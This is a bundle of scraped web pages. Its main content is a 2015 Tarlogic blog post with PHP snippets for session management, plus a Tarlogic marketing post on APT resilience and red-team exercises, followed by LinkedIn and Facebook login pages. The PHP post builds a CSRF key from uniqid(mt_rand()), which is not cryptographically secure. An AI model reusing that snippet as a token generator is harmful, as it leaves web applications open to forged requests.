=== Content from www.tarlogic.com_c81cafd5_20250126_040703.html ===


* [Home](/)
* [Services](https://www.tarlogic.com/cybersecurity-services/)
  + Advanced penetration testing services
    - [Red Team services](https://www.tarlogic.com/red-team-services/)
    - [External & internal pentesting](https://www.tarlogic.com/penetration-testing-services/ "Penetration Testing services")
    - [Social Engineering](https://www.tarlogic.com/social-engineering/)
    - [Wi-Fi Pentest](https://www.tarlogic.com/wifi-pentest/)
    - Cyber intelligence services
    - [Threat Intelligence](https://www.tarlogic.com/threat-intelligence/)
    - [Digital surveillance](https://www.tarlogic.com/digital-surveillance/)
    - [Fraud investigation and analysis](https://www.tarlogic.com/fraud-investigation/ "Fraud investigation ")
    - [Strategic Cyber-Intelligence](https://www.tarlogic.com/strategic-cyber-intelligence/ "Strategic Cyber Intelligence")
  + Security assessment services
    - [Web Security Audit](https://www.tarlogic.com/website-security-audit/ "Website security audit")
    - [Mobile Application Security Test Audit](https://www.tarlogic.com/mobile-app-audit/ "Mobile application security audits")
    - [IOT Security testing](https://www.tarlogic.com/iot-security-testing/ "IoT Security assessment")
    - [Cloud Infrastructures security audit](https://www.tarlogic.com/cloud-security-assessment/ "Cloud security assessment")
    - [Reverse Engineering & Hardware Hacking](https://www.tarlogic.com/hardware-hacking-and-reverse-engineering-services/ "Reverse Engineering")
    - [Code Security Audit](https://www.tarlogic.com/code-security-audit/)
    - [Technologies and Operating Systems Hardening](https://www.tarlogic.com/operating-system-hardening/ "Hardening")
    - [Advanced Bank Infrastructures Security Assessment](https://www.tarlogic.com/advanced-bank-security-assessment/ "Bank Infrastructures Security Assessment")
  + Attack Surface Reduction services
    - [Vulnerability Management](https://www.tarlogic.com/vulnerability-management/ "Vulnerability management service")
    - [Emerging vulnerabilities 24√ó7](https://www.tarlogic.com/emerging-vulnerabilities/ "Emerging vulnerability management service")
    - [Denial of service simulation (DoS)](https://www.tarlogic.com/dos-test/ "Denial of service test")
    - [Managed Bug Bounty program](https://www.tarlogic.com/bug-bounty/ "Bug bounty service")
    - [Dynamic Risk Assessment and Threat Prioritization](https://www.tarlogic.com/threat-priorization/ "Threat Priorization")
    - Protection and response
    - [Threat Hunting services](https://www.tarlogic.com/threat-hunting/ "Threat Hunting")
    - [Incident Response Services](https://www.tarlogic.com/incident-response/ "Incident Response")
* [BlackArrow](https://www.tarlogic.com/blackarrow/)
* [Blog](https://www.tarlogic.com/blog/)
* [Contact](https://www.tarlogic.com/contact/ "Contactar con tarlogic")
* [EN](https://www.tarlogic.com/blog/how-to-generate-php-sessions-securely/ "EN")
  + [ES](https://www.tarlogic.com/es/blog/como-generar-sesiones-php-forma-segura/ "ES")

* EN
  + [ES](https://www.tarlogic.com/es/blog/como-generar-sesiones-php-forma-segura/)

![Cybersecurity blog header](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog-tarlogic-banner-post_blur.jpg)

[Home](https://www.tarlogic.com)
/
[Blog](https://www.tarlogic.com/blog/)
/
How to generate PHP sessions securely

# How to generate PHP sessions securely

16 - Feb - 2015

When conducting a [web security assessment](https://www.tarlogic.com/website-security-audit/) against a web application, one of the attack paths is session management. The possibility that someone can impersonate another user, or interact with application modules without being authenticated can cause headaches for developers and the organization.

There are several complex aspects of session management, but all this starts to become simpler if we centralize all the code responsible for this management in a single module. Once we have defined the file that will be the central repository of the session management functions, it is necessary to include this module in all our web pages.

Depending on our development framework, the inclusion of these functions will be done through ‚Äúautoload‚Äù methods, through require() / include(), or other mechanisms enabled for module loading.

Our code must ensure that a session is initialized on each HTTP request. We are going to use for this example the security.php file that will be loaded by all the modules of the web application through the methods mentioned in the previous paragraph.

`/* We initialize the session*/

session_start();`

If we want to ensure the privacy of our pages, and that they indicate that they should not be cached by any intermediate proxy, we can include the following directives.

`/* We state that pages cannot be cached. */

header("Expires: Tue, 01 Jul 2001 06:00:00 GMT");

header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");

header("Cache-Control: no-store, no-cache, must-revalidate");

header("Cache-Control: post-check=0, pre-check=0", false);

header("Pragma: no-cache");`

At this point, in which the user‚Äôs session has been initialized on the server, and that the session information has been transmitted to the user through a cookie, we must define somewhere in our application a function that is responsible for destroying the user‚Äôs session. This function has to be called from several places, being the fundamental one the logout.php page of our application (or the method used to disconnect the user), as well as the login.php page, since we will consider that any user that accesses this page wants to log in to the software, and we must invalidate his previous credentials.

`function logOut() {

session_unset();

session_destroy();

session_start();

session_regenerate_id(true);

}`

To destroy a session in php we must delete all the variables in the global array $\_SESSION by calling session\_unset(). The call to session\_destroy() will delete all the information associated with the session on the server. After invalidating the previous session, we will create a new session containing a new session identifier with session\_regenerate\_id(). These steps will ensure that the previous session is completely invalidated.

A session fixation attack is one in which a user is able to steal another user‚Äôs session and impersonate his identity. To protect ourselves from such attacks, a first approach we should take after initializing the user‚Äôs session is to store certain session variables with client information:

`$_SESSION

['userAgent'] = $_SERVER['HTTP_USER_AGENT'];

$_SESSION['SKey'] = uniqid(mt_rand(), true);

$_SESSION['IPaddress'] = ExtractUserIpAddress();

$_SESSION['LastActivity'] = $_SERVER['REQUEST_TIME'];`

In our scenario, the two most important fields are the IP of the user making the HTTP request, and the version of his browser. For activity control purposes, we will also store the date on which the request is made to the web server.

To protect ourselves from such attacks what we must check in each request is that there are no modifications in the browser parameters (IP, browser), since this would mean that someone from a different location than the user‚Äôs previous one is trying to impersonate him. The date of the last activity must not exceed a threshold defined by us, such as 120 minutes. In the event of a change in any of the above parameters, or if the user‚Äôs session has expired while accessing the web server, we must immediately call the logOut() method and exit with an exit();

Access from mobile devices can disrupt plans for comprehensive IP address control. An alternative approach may be to ignore the ip change if it has occurred from a mobile device, identifiable by the browser‚Äôs User Agent. In the future we will talk about additional geolocation-based control and additional heuristic rules to determine if the user on the other side of the connection is really who he was supposed to be at the beginning.

We have already taken away a number of problems to avoid annoying attacks against the user‚Äôs session so let‚Äôs go with one last additional recommendation to protect a web application against attacks from unauthenticated users. .

Let‚Äôs imagine that our website has several pages that must be accessed anonymously, such as login.php , register.php and logout.php, and that after authenticating the user sets a session variable $\_SESSION[‚Äòregistered‚Äô] = 1 and starts accessing a number of protected resources;

At the end of our security.php script we can check for session information, so in case the user is not registered in the application ( `$_SESSION['registered']`) and the page accessed is not one of those mentioned in the previous point, a call to exit() must be made. This way, an unauthenticated user will not be able to execute any system script.

And you may ask, what is `$_SESSION['SKey']?` for? Well, to avoid [CSRF attacks](https://owasp.org/www-community/attacks/csrf).

Discover our work and¬†[cybersecurity services](https://www.tarlogic.com/cybersecurity-services/)¬†at¬†[www.tarlogic.com](https://www.tarlogic.com/)

Share this article

[Facebook](https://www.facebook.com/sharer.php?u=https://www.tarlogic.com/blog/how-to-generate-php-sessions-securely/) -
[Twitter](https://x.com/share?text=How to generate PHP sessions securely&url=https://www.tarlogic.com/blog/how-to-generate-php-sessions-securely/) -
[Linkedin](https://www.linkedin.com/shareArticle?mini=true&url=https://www.tarlogic.com/blog/how-to-generate-php-sessions-securely/&title=How to generate PHP sessions securely&summary=Discover how to generate PHP sessions securely by avoiding session fixation attacks and using secure cookies.)

##### Related Posts

[![Continuous Threat Hunting vs. Campaign-based Threat Hunting](data:image/gif;base64...)](https://www.tarlogic.com/blog/continuous-threat-hunting-vs-campaign-based/)
###### [Continuous Threat Hunting vs. Campaign-based Threat Hunting](https://www.tarlogic.com/blog/continuous-threat-hunting-vs-campaign-based/)

28 - June - 2024
Alberto Terceiro

[Read more](https://www.tarlogic.com/blog/continuous-threat-hunting-vs-campaign-based/)

[![PLCTool, the Swiss army knife of smart meters](data:image/gif;base64...)](https://www.tarlogic.com/blog/plctool-swiss-army-knife-of-smart-meters/)
###### [PLCTool, the Swiss army knife of smart meters](https://www.tarlogic.com/blog/plctool-swiss-army-knife-of-smart-meters/)

16 - March - 2022
Fran AW, David Sandoval, Jes√∫s Moreno, Antonio V√°zquez

[Read more](https://www.tarlogic.com/blog/plctool-swiss-army-knife-of-smart-meters/)

[![Risks of hardware design](data:image/gif;base64...)](https://www.tarlogic.com/blog/risks-of-hardware-design/)
###### [Risks of hardware design](https://www.tarlogic.com/blog/risks-of-hardware-design/)

15 - February - 2022
David Sandoval, Fran AW, Antonio V√°zquez

[Read more](https://www.tarlogic.com/blog/risks-of-hardware-design/)

## How can we help you?

Contact our cybersecurity team for any questions or if you are in need of an assessment!

[Contact](https://www.tarlogic.com/contact/)

![world](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/tarlogic-cybersecurity-company-footer_blur.webp)

###### BUSINESS UNITS

* [CYBERSECURITY](https://www.tarlogic.com/cybersecurity-services/ "CYBERSECURITY SERVICES")
* [CYBER INTELLIGENCE](https://www.tarlogic.com/cyber-intelligence/ "CYBER INTELLIGENCE SERVICES")
* [BLACKARROW](https://www.tarlogic.com/blackarrow/ "BLACKARROW SERVICES")

###### CONTACT INFO

[EUROPE HQ:
Madrid
 Quintanavides 13-23,
 Business Park V√≠a Norte 2nd building,
 Las Tablas, 28050](https://www.google.com/maps?cid=15171011320439567448)
 (+34) 912 919 319

 contact@tarlogic.com

###### LINKS

* [Cybersecurity Products](https://www.tarlogic.com/cybersecurity-products/)
* [Cybersecurity Careers](https://www.tarlogic.com/cybersecurity-jobs-careers/)
* [Cybersecurity Glossary](https://www.tarlogic.com/cybersecurity-glossary/)
* [Tarlogic News](https://www.tarlogic.com/news/)
* [Cybersecurity company (About us)](https://www.tarlogic.com/about-tarlogic/)
* [BSAM Bluetooth Security Methodology](https://www.tarlogic.com/bsam/)
* [Sectors](https://www.tarlogic.com/sectors/)
* [Partner Channel](https://www.tarlogic.com/partners/)

¬© 2025 all rights reserved Tarlogic | Cyber security and Cyber intelligence experts

[Privacy policy](https://www.tarlogic.com/privacy-policy/) - [Legal notice](https://www.tarlogic.com/legal-notice/) - [Management policy](https://www.tarlogic.com/management-policy/) - [Cookies policy](https://www.tarlogic.com/cookies-policy/) - [Whistle-blower channel](https://tarlogic-security.factorialhr.es/complaints)

We are using cookies to give you the best experience on our website. You can find out more about which cookies we are using or switch them off in Cookies Settings

I agree

###### Necessary

Strictly Necessary Cookie should be enabled at all times so that we can save your preferences for cookie settings.

Necessary cookies
###### 3rd Party Cookies

This website uses Google Analytics to collect anonymous information such as the number of visitors to the site, and the most popular pages.
Keeping this cookie enabled helps us to improve our website.

3rd party cookies

Enable all
Save settings
[Cookies policy](https://www.tarlogic.com/cookies-policy/)

[Contact us now üí¨](#top)



=== Content from www.linkedin.com_acf21521_20250126_040721.html ===


LinkedIn and 3rd parties use essential and non-essential cookies to provide, secure, analyze and improve our Services, and to show you relevant ads (including **professional and job ads**) on and off LinkedIn. Learn more in our [Cookie Policy](https://www.linkedin.com/legal/cookie-policy).

Select Accept to consent or Reject to decline non-essential cookies for this use. You can update your choices at any time in your [settings](https://www.linkedin.com/mypreferences/g/guest-cookies).

Accept

Reject

# Sign in

Stay updated on your professional world.

Email or phone

Password

Show

[Forgot password?](/checkpoint/rp/request-password-reset?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2FshareArticle%3Fmini%3Dtrue%26url%3Dhttps%3A%2F%2Fwww%2Etarlogic%2Ecom%2Fblog%2Fexploiting-word-cve-2017-11826%2F%26title)

Keep me logged in

Sign in

or

By clicking Continue, you agree to LinkedIn‚Äôs [User Agreement](/legal/user-agreement), [Privacy Policy](/legal/privacy-policy), and [Cookie Policy](/legal/cookie-policy).

Sign in with Apple

Sign in with a passkey

## We‚Äôve emailed a one-time link to your primary email address

Click on the link to sign in instantly to your LinkedIn account.

If you don‚Äôt see the email in your inbox, check your spam folder.

Resend email

Back

New to LinkedIn? [Join now](/signup/cold-join?session_redirect=https%3A%2F%2Fwww.linkedin.com%2FshareArticle%3Fmini%3Dtrue%26url%3Dhttps%3A%2F%2Fwww.tarlogic.com%2Fblog%2Fexploiting-word-cve-2017-11826%2F%26title)

![](https://ponf.linkedin.com/pixel/tracking.png?reqid=02ca28cc-9cca-4ae4-826f-184012c264a8&pageInstance=urn:li:page:checkpoint_lg_uasLogin;7APUl6GdRliHRYzMR0GXYg==&js=disabled)

Agree & Join LinkedIn

By clicking Continue, you agree to LinkedIn‚Äôs [User Agreement](/legal/user-agreement), [Privacy Policy](/legal/privacy-policy), and [Cookie Policy](/legal/cookie-policy).

*LinkedIn

¬© 2025*

* [User Agreement](/legal/user-agreement?trk=d_checkpoint_lg_consumerLogin_ft_user_agreement)
* [Privacy Policy](/legal/privacy-policy?trk=d_checkpoint_lg_consumerLogin_ft_privacy_policy)
* [Community Guidelines](/help/linkedin/answer/34593?lang=en&trk=d_checkpoint_lg_consumerLogin_ft_community_guidelines)
* [Cookie Policy](/legal/cookie-policy?trk=d_checkpoint_lg_consumerLogin_ft_cookie_policy)
* [Copyright Policy](/legal/copyright-policy?trk=d_checkpoint_lg_consumerLogin_ft_copyright_policy)
* [Send Feedback](/help/linkedin?trk=d_checkpoint_lg_consumerLogin_ft_send_feedback&lang=en)
* Language

  + ÿßŸÑÿπÿ±ÿ®Ÿäÿ© (Arabic)
  + ‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ (Bangla)
  + ƒåe≈°tina (Czech)
  + Dansk (Danish)
  + Deutsch (German)
  + ŒïŒªŒªŒ∑ŒΩŒπŒ∫Œ¨ (Greek)
  + **English (English)**
  + Espa√±ol (Spanish)
  + ŸÅÿßÿ±ÿ≥€å (Persian)
  + Suomi (Finnish)
  + Fran√ßais (French)
  + ‡§π‡§ø‡§Ç‡§¶‡•Ä (Hindi)
  + Magyar (Hungarian)
  + Bahasa Indonesia (Indonesian)
  + Italiano (Italian)
  + ◊¢◊ë◊®◊ô◊™ (Hebrew)
  + Êó•Êú¨Ë™û (Japanese)
  + ÌïúÍµ≠Ïñ¥ (Korean)
  + ‡§Æ‡§∞‡§æ‡§†‡•Ä (Marathi)
  + Bahasa Malaysia (Malay)
  + Nederlands (Dutch)
  + Norsk (Norwegian)
  + ‡®™‡©∞‡®ú‡®æ‡®¨‡©Ä (Punjabi)
  + Polski (Polish)
  + Portugu√™s (Portuguese)
  + Rom√¢nƒÉ (Romanian)
  + –†—É—Å—Å–∫–∏–π (Russian)
  + Svenska (Swedish)
  + ‡∞§‡±Ü‡∞≤‡±Å‡∞ó‡±Å (Telugu)
  + ‡∏†‡∏≤‡∏©‡∏≤‡πÑ‡∏ó‡∏¢ (Thai)
  + Tagalog (Tagalog)
  + T√ºrk√ße (Turkish)
  + –£–∫—Ä–∞—ó–Ω—Å—å–∫–∞ (Ukrainian)
  + Ti·∫øng Vi·ªát (Vietnamese)
  + ÁÆÄ‰Ωì‰∏≠Êñá (Chinese (Simplified))
  + Ê≠£È´î‰∏≠Êñá (Chinese (Traditional))



=== Content from www.tarlogic.com_4aaec173_20250126_040704.html ===


* [Home](/)
* [Services](https://www.tarlogic.com/cybersecurity-services/)
  + Advanced penetration testing services
    - [Red Team services](https://www.tarlogic.com/red-team-services/)
    - [External & internal pentesting](https://www.tarlogic.com/penetration-testing-services/ "Penetration Testing services")
    - [Social Engineering](https://www.tarlogic.com/social-engineering/)
    - [Wi-Fi Pentest](https://www.tarlogic.com/wifi-pentest/)
    - Cyber intelligence services
    - [Threat Intelligence](https://www.tarlogic.com/threat-intelligence/)
    - [Digital surveillance](https://www.tarlogic.com/digital-surveillance/)
    - [Fraud investigation and analysis](https://www.tarlogic.com/fraud-investigation/ "Fraud investigation ")
    - [Strategic Cyber-Intelligence](https://www.tarlogic.com/strategic-cyber-intelligence/ "Strategic Cyber Intelligence")
  + Security assessment services
    - [Web Security Audit](https://www.tarlogic.com/website-security-audit/ "Website security audit")
    - [Mobile Application Security Test Audit](https://www.tarlogic.com/mobile-app-audit/ "Mobile application security audits")
    - [IOT Security testing](https://www.tarlogic.com/iot-security-testing/ "IoT Security assessment")
    - [Cloud Infrastructures security audit](https://www.tarlogic.com/cloud-security-assessment/ "Cloud security assessment")
    - [Reverse Engineering & Hardware Hacking](https://www.tarlogic.com/hardware-hacking-and-reverse-engineering-services/ "Reverse Engineering")
    - [Code Security Audit](https://www.tarlogic.com/code-security-audit/)
    - [Technologies and Operating Systems Hardening](https://www.tarlogic.com/operating-system-hardening/ "Hardening")
    - [Advanced Bank Infrastructures Security Assessment](https://www.tarlogic.com/advanced-bank-security-assessment/ "Bank Infrastructures Security Assessment")
  + Attack Surface Reduction services
    - [Vulnerability Management](https://www.tarlogic.com/vulnerability-management/ "Vulnerability management service")
    - [Emerging vulnerabilities 24√ó7](https://www.tarlogic.com/emerging-vulnerabilities/ "Emerging vulnerability management service")
    - [Denial of service simulation (DoS)](https://www.tarlogic.com/dos-test/ "Denial of service test")
    - [Managed Bug Bounty program](https://www.tarlogic.com/bug-bounty/ "Bug bounty service")
    - [Dynamic Risk Assessment and Threat Prioritization](https://www.tarlogic.com/threat-priorization/ "Threat Priorization")
    - Protection and response
    - [Threat Hunting services](https://www.tarlogic.com/threat-hunting/ "Threat Hunting")
    - [Incident Response Services](https://www.tarlogic.com/incident-response/ "Incident Response")
* [BlackArrow](https://www.tarlogic.com/blackarrow/)
* [Blog](https://www.tarlogic.com/blog/)
* [Contact](https://www.tarlogic.com/contact/ "Contactar con tarlogic")
* [EN](https://www.tarlogic.com/blog/apt-intrusion-test/ "EN")
  + [ES](https://www.tarlogic.com/es/blog/test-intrusion-apt/ "ES")

* EN
  + [ES](https://www.tarlogic.com/es/blog/test-intrusion-apt/)

![Cybersecurity blog header](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog-tarlogic-banner-post_blur.jpg)

[Home](https://www.tarlogic.com)
/
[Blog](https://www.tarlogic.com/blog/)
/
Improving APT resilience

# Improving APT resilience

06 - Mar - 2023
- Ciber 4 All Team

Table of Contents

* [A general approach to accelerating APT defensive capabilities](#A_general_approach_to_accelerating_APT_defensive_capabilities "A general approach to accelerating APT defensive capabilities")
* [A particular approach to compromise using APTs](#A_particular_approach_to_compromise_using_APTs "A particular approach to compromise using APTs")
* [Particular focus on identifying and designing APT resilience improvement opportunities](#Particular_focus_on_identifying_and_designing_APT_resilience_improvement_opportunities "Particular focus on identifying and designing APT resilience improvement opportunities")
* [Benefits of a TPA engagement exercise](#Benefits_of_a_TPA_engagement_exercise "Benefits of a TPA engagement exercise")
## [ATP Resilience Enhancement is helpful in case of sophisticated and targeted attacks](https://www.tarlogic.com/wp-content/uploads/2023/02/APT1.webp)

APT Resilience Enhancement combines offensive and defensive capabilities to optimize an organization‚Äôs defensive layers

APT, or advanced persistent threat, has become increasingly common to refer to the **new advanced and targeted threats** facing organizations.

Behind these threats can be found a variety of actors, from foreign governments to activist groups to competitor companies looking to **steal R&D and corporate information** or eventually damage ICT infrastructure, for example, by deploying ransomware.

The risk of an APT in enterprises lies in the identification difficulty, which can allow it to persist for a long period on corporate systems, enabling APT operators to perform **malicious actions against an organization‚Äôs interests**.

## A general approach to accelerating APT defensive capabilities

How resilient is an organization to a targeted APT, and are the defensive layers sufficiently optimized to respond to such a sophisticated attack?

**APT Resilience Enhancement** brings together offensive capabilities, such as those that could be performed by [**Red Team services**](https://www.tarlogic.com/red-team-services/), with the defensive capabilities that a [**Threat Hunting**](https://www.tarlogic.com/threat-hunting/) team could suggest, helping not only to answer the above questions but also to accelerate and **optimize defensive capabilities** in terms of detection, containment and response.

The process of accelerating detection and response layers against an APT involves the execution of the following sequence of activities for the best integration of the offensive techniques of an APT in the defensive layers:

[![Tarlogic implements a sequence of activities to improve the APT detection and response layer process](data:image/gif;base64...)![Tarlogic implements a sequence of activities to improve the APT detection and response layer process](https://www.tarlogic.com/wp-content/uploads/2023/02/APT-2-Eng.webp)](https://www.tarlogic.com/wp-content/uploads/2023/02/APT-2-Eng.webp)

## A particular approach to compromise using APTs

An **APT compromise** involves a **targeted and highly specialized attack** **against an organization** designed to maintain continuous access over time. This type of exercise is characterized by using different entry vectors, such as zero-day vulnerabilities or phishing attacks against specific employees of an organization, among others.

[![APT Resilience Enhancement combines defensive and offensive capabilities](data:image/gif;base64...)![APT Resilience Enhancement combines defensive and offensive capabilities](https://www.tarlogic.com/wp-content/uploads/2023/02/APT-3.webp)](https://www.tarlogic.com/wp-content/uploads/2023/02/APT-3.webp)

The final design of the **APT compromise exercise** must be agreed upon before the start of the exercise and requires advanced malware with sophisticated infection capabilities, control of compromised computers, concealment of malicious activity, pivoting for lateral movement, the elevation of privilege and persistence, among other qualities, and a highly specialized team capable of operating the service.

During the execution of the APT compromise exercise, the **Tarlogic Security** team performs, in a controlled manner, a **targeted attack against an organization** to gain access to its corporate infrastructure through previously agreed entry vectors and deploy an APT specially designed to:

* **Infect corporate systems**.
* Perform lateral movements on the organization‚Äôs systems.
* **Elevate privileges** where required.
* Maintain persistence that allows the **control of compromised computers** over time.
* Carrying out previously agreed impact activities, such as:
  + Identifying and exfiltrating sensitive information.
  + Deployment of Ransomware
  + Any other pre-agreed impact actions

## Particular focus on identifying and designing APT resilience improvement opportunities

Our **Threat Hunting team** constantly monitors the main APTs and studies the [TTPs](https://csrc.nist.gov/glossary/term/tactics_techniques_and_procedures) they may use, building an important Threat Hunting Intelligene‚Ñ¢ knowledge base that can be easily exported to any organization.

[![Threat Hunting and Red Team services enable APT resiliency enhancement](data:image/gif;base64...)![Threat Hunting and Red Team services enable APT resiliency enhancement](https://www.tarlogic.com/wp-content/uploads/2023/02/APT-4.webp)](https://www.tarlogic.com/wp-content/uploads/2023/02/APT-4.webp)

Since the daily work of the Threat Hunting team is focused on **researching malicious techniques** and identifying and designing detection opportunities, this positions us as an essential accelerator to apply all our **defensive knowledge against APT attacks**.

In this way, as new TTPs used by APTs are tested, and detection improvements are designed, we are helping organizations to build strong defense capabilities. In addition, this approach has enabled us to provide **Proactive Threat Hunting** strategies for the detection of the main APTs in use today, as summarized below:

[![Proactive Threat Hunting strategies help to detect the main APTs used today](data:image/gif;base64...)![Proactive Threat Hunting strategies help to detect the main APTs used today](https://www.tarlogic.com/wp-content/uploads/2023/02/APT-Mitre-scaled.webp)](https://www.tarlogic.com/wp-content/uploads/2023/02/APT-Mitre-scaled.webp)

For each TTP employed by the APT, we should ask ourselves the following questions to determine the **level of resilience of an organization**:

* Is there telemetry associated with the TTP?
* Has an alert been generated, or is there an effective process to detect the TTP and confirm its malicious nature?
* Has the case been investigated to both the root cause of the compromise and the full impact received?

Many organizations can only answer yes to the first question, meaning they have the technology to deal with an APT successfully but need to use it effectively. Overcoming this state of resilience is one of the main challenges we see today; hence, implementing **APT Resilience Improvement** is of great value.

## Benefits of a TPA engagement exercise

In line with the above, our **APT engagement exercise** approach maximizes that the defensive layers absorb the full value of the exercise. This makes it possible to get the most out of the investment dedicated to this type of exercise because:

* It allows for assessing the risk in a sophisticated targeted attack.
* It helps to know the **capabilities of detection and response to APT** and, therefore, to objectify the level of resilience of an organization concerning targeted attacks.
* Estimates the **maturity level of the organization‚Äôs defensive capabilities** and the coordination of the different teams and their incident response processes by detecting, containing and mitigating the risk of this type of threat.
* Identifies possibilities for improving defensive layers at the technical and procedural control levels.
* **Accelerates the training of Blue Team, Threat Hunting or SOC** teams that the organization may have.

Share this article

[Facebook](https://www.facebook.com/sharer.php?u=https://www.tarlogic.com/blog/apt-intrusion-test/) -
[Twitter](https://x.com/share?text=Improving APT resilience&url=https://www.tarlogic.com/blog/apt-intrusion-test/) -
[Linkedin](https://www.linkedin.com/shareArticle?mini=true&url=https://www.tarlogic.com/blog/apt-intrusion-test/&title=Improving APT resilience&summary=APT Resilience Enhancement combines offensive and defensive capabilities to optimize an organization's defensive layers)

##### Related Posts

[![OWASP methodology, the beacon illuminating cyber risks](data:image/gif;base64...)](https://www.tarlogic.com/blog/owasp-methodology/)
###### [OWASP methodology, the beacon illuminating cyber risks](https://www.tarlogic.com/blog/owasp-methodology/)

29 - December - 2021
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/owasp-methodology/)

[![TIBER-EU calls on cyber intelligence to arm banks](data:image/gif;base64...)](https://www.tarlogic.com/blog/tiber-eu-cyber-intelligence/)
###### [TIBER-EU calls on cyber intelligence to arm banks](https://www.tarlogic.com/blog/tiber-eu-cyber-intelligence/)

03 - February - 2022
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/tiber-eu-cyber-intelligence/)

[![How shimming works and how you can prevent it](data:image/gif;base64...)](https://www.tarlogic.com/blog/shimming-how-works-prevent/)
###### [How shimming works and how you can prevent it](https://www.tarlogic.com/blog/shimming-how-works-prevent/)

02 - May - 2024
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/shimming-how-works-prevent/)

## How can we help you?

Contact our cybersecurity team for any questions or if you are in need of an assessment!

[Contact](https://www.tarlogic.com/contact/)

![world](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/tarlogic-cybersecurity-company-footer_blur.webp)

###### BUSINESS UNITS

* [CYBERSECURITY](https://www.tarlogic.com/cybersecurity-services/ "CYBERSECURITY SERVICES")
* [CYBER INTELLIGENCE](https://www.tarlogic.com/cyber-intelligence/ "CYBER INTELLIGENCE SERVICES")
* [BLACKARROW](https://www.tarlogic.com/blackarrow/ "BLACKARROW SERVICES")

###### CONTACT INFO

[EUROPE HQ:
Madrid
 Quintanavides 13-23,
 Business Park V√≠a Norte 2nd building,
 Las Tablas, 28050](https://www.google.com/maps?cid=15171011320439567448)
 (+34) 912 919 319

 contact@tarlogic.com

###### LINKS

* [Cybersecurity Products](https://www.tarlogic.com/cybersecurity-products/)
* [Cybersecurity Careers](https://www.tarlogic.com/cybersecurity-jobs-careers/)
* [Cybersecurity Glossary](https://www.tarlogic.com/cybersecurity-glossary/)
* [Tarlogic News](https://www.tarlogic.com/news/)
* [Cybersecurity company (About us)](https://www.tarlogic.com/about-tarlogic/)
* [BSAM Bluetooth Security Methodology](https://www.tarlogic.com/bsam/)
* [Sectors](https://www.tarlogic.com/sectors/)
* [Partner Channel](https://www.tarlogic.com/partners/)

¬© 2025 all rights reserved Tarlogic | Cyber security and Cyber intelligence experts

[Privacy policy](https://www.tarlogic.com/privacy-policy/) - [Legal notice](https://www.tarlogic.com/legal-notice/) - [Management policy](https://www.tarlogic.com/management-policy/) - [Cookies policy](https://www.tarlogic.com/cookies-policy/) - [Whistle-blower channel](https://tarlogic-security.factorialhr.es/complaints)

We are using cookies to give you the best experience on our website. You can find out more about which cookies we are using or switch them off in Cookies Settings

I agree

###### Necessary

Strictly Necessary Cookie should be enabled at all times so that we can save your preferences for cookie settings.

Necessary cookies
###### 3rd Party Cookies

This website uses Google Analytics to collect anonymous information such as the number of visitors to the site, and the most popular pages.
Keeping this cookie enabled helps us to improve our website.

3rd party cookies

Enable all
Save settings
[Cookies policy](https://www.tarlogic.com/cookies-policy/)

[Contact us now üí¨](#top)



=== Content from www.facebook.com_29af9a28_20250126_040724.html ===

# [*Facebook*](https://www.facebook.com/ "Go to Facebook home")

| Email or phone | Password |
| --- | --- |
|  |  |  |
|  | [Forgot account?](https://www.facebook.com/recover/initiate?lwv=110&ars=royal_blue_bar) |

[Sign Up](/r.php?locale=en_US)
## Not Logged In

## Not Logged In

You are not logged in. Please login and try again.

* [Return home](/)

* English (US)
* [Gaeilge](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.tarlogic.com%2Fblog%2Fexploiting-word-cve-2017-11826%2F "Irish")
* [Polski](https://ga-ie.facebook.com/sharer.php?u=https%3A%2F%2Fwww.tarlogic.com%2Fblog%2Fexploiting-word-cve-2017-11826%2F "Polish")
* [Lietuvi≈≥](https://pl-pl.facebook.com/sharer.php?u=https%3A%2F%2Fwww.tarlogic.com%2Fblog%2Fexploiting-word-cve-2017-11826%2F "Lithuanian")
* [Portugu√™s (Brasil)](https://lt-lt.facebook.com/sharer.php?u=https%3A%2F%2Fwww.tarlogic.com%2Fblog%2Fexploiting-word-cve-2017-11826%2F "Portuguese (Brazil)")
* [–†—É—Å—Å–∫–∏–π](https://pt-br.facebook.com/sharer.php?u=https%3A%2F%2Fwww.tarlogic.com%2Fblog%2Fexploiting-word-cve-2017-11826%2F "Russian")
* [Rom√¢nƒÉ](https://ru-ru.facebook.com/sharer.php?u=https%3A%2F%2Fwww.tarlogic.com%2Fblog%2Fexploiting-word-cve-2017-11826%2F "Romanian")
* [Espa√±ol](https://ro-ro.facebook.com/sharer.php?u=https%3A%2F%2Fwww.tarlogic.com%2Fblog%2Fexploiting-word-cve-2017-11826%2F "Spanish")
* [Fran√ßais (France)](https://es-la.facebook.com/sharer.php?u=https%3A%2F%2Fwww.tarlogic.com%2Fblog%2Fexploiting-word-cve-2017-11826%2F "French (France)")
* [Deutsch](https://fr-fr.facebook.com/sharer.php?u=https%3A%2F%2Fwww.tarlogic.com%2Fblog%2Fexploiting-word-cve-2017-11826%2F "German")
* [Italiano](https://de-de.facebook.com/sharer.php?u=https%3A%2F%2Fwww.tarlogic.com%2Fblog%2Fexploiting-word-cve-2017-11826%2F "Italian")

* [Sign Up](/reg/ "Sign Up for Facebook")
* [Log In](/login/ "Log into Facebook")
* [Messenger](https://messenger.com/ "Check out Messenger.")
* [Facebook Lite](/lite/ "Facebook Lite for Android.")
* [Video](https://www.facebook.com/watch/ "Browse in Video")
* [Places](/places/ "Check out popular places on Facebook.")
* [Games](/games/ "Check out Facebook games.")
* [Marketplace](/marketplace/ "Buy and sell on Facebook Marketplace.")
* [Meta Pay](https://about.meta.com/technologies/meta-pay "Learn more about Meta Pay")
* [Meta Store](https://www.meta.com/ "Check out Meta")
* [Meta Quest](https://www.meta.com/quest/ "Learn more about Meta Quest")
* [Ray-Ban Meta](https://www.meta.com/smart-glasses/ "Learn more about Ray-Ban Meta")
* [Meta AI](https://www.meta.ai/ "Meta AI")
